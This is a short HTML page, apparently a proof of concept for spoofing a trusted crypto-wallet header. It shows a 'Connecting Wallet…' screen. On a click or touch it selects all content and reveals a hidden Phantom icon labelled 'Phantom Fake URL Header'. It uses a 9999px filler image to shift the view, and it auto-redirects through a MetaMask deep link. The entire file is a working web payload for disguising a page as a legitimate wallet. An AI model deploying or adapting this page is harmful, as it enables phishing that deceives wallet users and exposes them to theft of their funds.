<!DOCTYPE html>
<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
<head>
  <title>Connecting Wallet...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: white;
      text-align: center;
    }
    #spoof {
      display: none;
      width: 100%;
    }
    img.filler {
      margin-top: 9999px;
    }
  </style>
  <script>
    function rfsSelectAll() {
      document.execCommand("selectAll");
      document.getElementById("spoof").style.display = "block";
    }

    function selectAllChildren() {
      document.getSelection().selectAllChildren(paragraph1);
    }

    // Deep link behavior
    window.onload = () => {
      setTimeout(() => {
        location.href = "metamask://connect?redirect=https://phantom.com";
      }, 1000);

      // Fallback to install page
      setTimeout(() => {
        location.href = "https://metamask.io/download/";
      }, 5000);
    };
  </script>
</head>
<body>
  <img id="spoof" src="https://docs.phantom.app/assets/phantom-icon-purple-842e5b50.svg" alt="Phantom Fake URL Header" />
  <h2>Connecting Wallet…</h2>
  <p id="paragraph1">Touch anywhere to continue…</p>
  <img class="filler" />
</body>
</html>
